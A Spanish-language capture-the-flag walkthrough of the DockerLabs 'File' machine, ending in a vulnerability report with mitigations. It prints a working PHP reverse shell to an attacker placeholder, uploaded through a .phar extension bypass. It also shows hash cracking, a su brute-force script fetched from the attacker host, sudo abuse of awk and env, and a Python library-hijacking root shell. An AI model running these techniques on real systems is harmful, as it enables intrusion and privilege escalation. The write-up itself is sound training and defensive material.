# File

> FTP anónimo que filtra un hash, subida de archivos con bypass de extensión (.phar) para una web shell como www-data, fuerza bruta local con su y una escalada encadenada mario → julen → iker → root abusando de sudo (awk, env) y de un Python Library Hijacking.

| | |
|---|---|
| **Plataforma** | DockerLabs |
| **Dificultad** | Fácil |
| **Objetivo** | `172.17.0.2` |
| **Servicios** | 21/tcp (FTP), 80/tcp (HTTP) |
| **Saltos de usuario** | 4 |

**Tags:** `FTP` · `John` · `Gobuster` · `Subida de archivos` · `phar` · `Reverse shell` · `Fuerza bruta su` · `sudo` · `awk` · `env` · `Python Library Hijacking` · `GTFOBins`

---

## Reconocimiento

```bash
$ sudo nmap -p- -sS -sCV --open -n -Pn 172.17.0.2
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd (acceso anónimo permitido)
80/tcp open  http    Apache httpd
```

Dos puertos: FTP (21) con acceso anónimo y una web (80). Empiezo por el FTP.

## FTP anónimo

Entro al FTP como `anonymous` y me descargo el único fichero.

```bash
$ ftp 172.17.0.2
Name: anonymous
ftp> get anon.txt
ftp> bye
$ cat anon.txt
5f4dcc3b5aa765d61d8327deb882cf99...   <-- pinta de hash
```

Es un hash. Lo rompo con John.

```bash
$ john --format=raw-md5 anon.txt --wordlist=/usr/share/wordlists/rockyou.txt
justin           (?)
```

El hash era `justin`: un posible nombre de usuario, aunque la vía de entrada acabará siendo la web.

## Enumeración web

```bash
$ gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 50
/uploads              (Status: 301)
/file_upload.php      (Status: 200)
```

Dos hallazgos clave: un directorio `/uploads` y un `/file_upload.php` que resulta ser un formulario de subida de archivos.

## Subida de archivo y bypass de extensión

Intento subir una reverse shell en PHP, pero el formulario rechaza `.php`. Pruebo otras extensiones y descubro que `.phar` sí se permite (y Apache lo ejecuta igual que PHP). Creo `imagen.phar` con una reverse shell apuntando a mi máquina (`<IP_ATACANTE>`) en el puerto 4000.

```bash
<?php
$ip = "<IP_ATACANTE>";
$port = 4000;
$sock = fsockopen($ip, $port);
if ($sock) {
    $proc = proc_open("sh", array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
    if (is_resource($proc)) { proc_close($proc); }
    fclose($sock);
}
?>
```

Subo `imagen.phar` por el formulario (ahora sí lo acepta) y me pongo a la escucha.

```bash
$ nc -lvnp 4000
listening on [any] 4000 ...
```

En otra terminal disparo el archivo subido desde `/uploads`.

```bash
$ curl http://172.17.0.2/uploads/imagen.phar
```

Recibo la shell como **www-data**. La estabilizo con Python.

```bash
connect to [<IP_ATACANTE>] from (UNKNOWN) [172.17.0.2]
$ whoami
www-data
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Fuerza bruta de credenciales locales

Miro los usuarios del sistema con shell.

```bash
$ cat /etc/passwd | grep "/bin/bash"
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/bin/bash
fernando / mario / julen / iker
```

Varios usuarios locales. Me traigo a la víctima el script de fuerza bruta de `su` y el diccionario, sirviéndolos con un servidor HTTP desde mi máquina, y ataco a **mario**.

```bash
$ wget http://<IP_ATACANTE>:8000/su_bruteforce.sh
$ wget http://<IP_ATACANTE>:8000/rockyou.txt
$ chmod +x su_bruteforce.sh
$ ./su_bruteforce.sh mario rockyou.txt
Contraseña encontrada: password123
$ su mario
Password: (password123)
```

## De mario a julen · awk

```bash
$ sudo -l
User mario may run the following commands on e93d350dd1bf:
    (julen) NOPASSWD: /usr/bin/awk
```

mario puede ejecutar `awk` como julen. Según GTFOBins, awk lanza una shell con `system()`.

```bash
$ sudo -u julen awk 'BEGIN {system("/bin/bash")}'
julen@e93d350dd1bf:/$ whoami
julen
```

## De julen a iker · env

```bash
$ sudo -l
User julen may run the following commands on e93d350dd1bf:
    (iker) NOPASSWD: /usr/bin/env
```

julen puede ejecutar `env` como iker; env lanza cualquier binario (GTFOBins).

```bash
$ sudo -u iker /usr/bin/env /bin/bash -p
iker@e93d350dd1bf:~$ whoami
iker
```

## De iker a root · Python Library Hijacking

```bash
$ sudo -l
User iker may run the following commands on e93d350dd1bf:
    (ALL) NOPASSWD: /usr/bin/python3 /home/iker/geo_ip.py
```

iker puede ejecutar como root un script de Python. Miro qué hace.

```bash
$ cat /home/iker/geo_ip.py
import requests
ip = input('Introduce la direccion IP que quieras geolocalizar: ')
respuesta = requests.get(f'http://ip-api.com/json/{ip}')
...
```

> **Nota.** El script hace `import requests`. Python busca los módulos primero en el directorio actual, así que si creo un `requests.py` malicioso en `~/iker` (desde donde se ejecuta), Python cargará el mío en vez de la librería real. Como el script corre como root vía sudo, mi código se ejecuta como root.

```bash
$ echo -e 'import os;\nos.system("bash -p")' > requests.py
$ sudo /usr/bin/python3 /home/iker/geo_ip.py
root@e93d350dd1bf:/home/iker# whoami
root
```

Máquina File completada: `uid=0(root)`.

---

## Informe · vulnerabilidades y mitigaciones

### 🔴 CRÍTICA — Subida de archivos sin validar (bypass por extensión .phar)

`CWE-434` · A05:2021 – Security Misconfiguration

**Impacto.** file_upload.php bloquea .php pero no .phar; Apache ejecuta el .phar como PHP, dando una web shell y ejecución remota como www-data.

**Mitigación.** Validar el tipo real (magic bytes), lista blanca estricta de extensiones, renombrar al guardar y no permitir ejecución en el directorio de subidas.

### 🔴 CRÍTICA — Python Library Hijacking en script ejecutable por sudo

`CWE-426` · A08:2021 – Software and Data Integrity Failures

**Impacto.** iker puede ejecutar como root un script python que importa 'requests' desde su directorio; colocando un requests.py malicioso se obtiene una shell root.

**Mitigación.** Ejecutar con rutas e intérprete controlados (PYTHONPATH fijo), no permitir sudo sobre scripts en directorios escribibles y fijar el working directory.

### 🟠 ALTA — Contraseña de usuario local débil (fuerza bruta de su)

`CWE-521` · A07:2021 – Identification and Authentication Failures

**Impacto.** La cuenta mario usa una contraseña de diccionario (password123), descubierta por fuerza bruta local contra su.

**Mitigación.** Contraseñas robustas, bloqueo de intentos y monitorización de autenticaciones fallidas.

### 🟠 ALTA — Sudo mal configurado hacia otros usuarios (awk, env)

`CWE-250` · A05:2021 – Security Misconfiguration

**Impacto.** Reglas sudo permiten ejecutar awk como julen y env como iker, encadenando un pivote de usuario en usuario.

**Mitigación.** Mínimo privilegio en sudoers; no conceder binarios que pueden ejecutar comandos (awk, env) como otros usuarios.

### 🟡 MEDIA — Acceso anónimo al FTP con información sensible

`CWE-306` · A05:2021 – Security Misconfiguration

**Impacto.** El FTP permite login anónimo y expone anon.txt, un hash MD5 débil que se crackea offline.

**Mitigación.** Deshabilitar el acceso anónimo y no dejar ficheros sensibles en el FTP; usar hashes robustos y con sal.

---

_Writeup de **File** · DockerLabs · por [ak1t4](https://github.com/ak1ta4)_
